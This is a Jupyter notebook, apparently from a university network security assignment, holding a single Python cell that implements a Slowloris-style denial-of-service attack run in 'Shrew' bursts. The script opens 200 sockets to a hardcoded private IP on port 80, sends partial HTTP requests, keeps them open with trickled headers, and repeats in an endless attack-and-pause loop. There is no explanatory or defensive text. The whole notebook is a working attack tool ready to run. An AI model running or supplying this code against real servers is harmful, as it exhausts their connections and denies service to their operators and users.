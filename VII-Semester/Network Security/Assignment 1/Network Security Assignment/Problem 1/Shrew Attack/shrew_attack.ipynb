{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket, random, time, sys\n",
    "\n",
    "class Slowloris_Shrew():\n",
    "    def __init__(self, ip, port=80, socketsCount = 200):\n",
    "        self._ip = ip\n",
    "        self._port = port\n",
    "        self._headers = [\n",
    "            \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)\",\n",
    "            \"Accept-Language: en-us,en;q=0.5\"\n",
    "        ]\n",
    "        self._sockets = [self.newSocket() for _ in range(socketsCount)]\n",
    "\n",
    "    def getMessage(self, message):\n",
    "        return (message + \"{} HTTP/1.1\\r\\n\".format(str(random.randint(0, 2000)))).encode(\"utf-8\")\n",
    "\n",
    "    def newSocket(self):\n",
    "        try:\n",
    "            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "            s.settimeout(4)\n",
    "            s.connect((self._ip, self._port))\n",
    "            s.send(self.getMessage(\"Get /?\"))\n",
    "            for header in self._headers:\n",
    "                s.send(bytes(bytes(\"{}\\r\\n\".format(header).encode(\"utf-8\"))))\n",
    "            return s\n",
    "        except socket.error as se:\n",
    "            print(\"Error: \"+str(se))\n",
    "            time.sleep(0.5)\n",
    "            return self.newSocket()\n",
    "\n",
    "    def attack(self, timeout=sys.maxsize, sleep=15):\n",
    "        t, i = time.time(), 0\n",
    "        while(time.time() - t < timeout):\n",
    "            for s in self._sockets:\n",
    "                try:\n",
    "                    print(\"Sending request #{}\".format(str(i)))\n",
    "                    s.send(self.getMessage(\"X-a: \"))\n",
    "                    i += 1\n",
    "                except socket.error:\n",
    "                    self._sockets.remove(s)\n",
    "                    self._sockets.append(self.newSocket())\n",
    "                time.sleep(sleep/len(self._sockets))\n",
    "\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    addr = \"192.168.1.38\"\n",
    "    burst_period = 10\n",
    "    burst_duration = 20\n",
    "    total_time = 120\n",
    "    dos = Slowloris_Shrew(addr, 80, socketsCount=200)\n",
    "    while True:\n",
    "\t\t# burst period\n",
    "        #start_burst_time = time()\n",
    "        print(\"Attacking in burst now\", end='\\r')\n",
    "        dos.attack(timeout=burst_duration)\n",
    "        start_silent_time = time.time()\n",
    "        while True:\n",
    "            sleep_now = time.time()\n",
    "            sleep_delta = sleep_now - start_silent_time\n",
    "            print(\"Sleeping now\")\n",
    "            if sleep_delta >= burst_period:\n",
    "                break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.8 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "e2efb0fc858484434c07a428837b08853f492de3fdea316db98cd7993ab2042a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
